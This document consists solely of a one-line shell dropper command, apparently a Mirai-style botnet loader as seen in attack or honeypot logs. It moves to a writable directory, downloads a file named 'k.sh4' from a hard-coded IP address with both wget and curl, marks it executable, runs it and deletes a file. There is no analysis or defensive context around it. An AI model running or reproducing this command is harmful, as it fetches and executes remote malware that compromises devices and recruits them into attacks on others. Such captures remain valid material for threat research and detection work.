cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://191.96.112.116/k.sh4; curl -O http://191.96.112.116/k.sh4; chmod +x k.sh4; ./k.sh4; rm -rf o
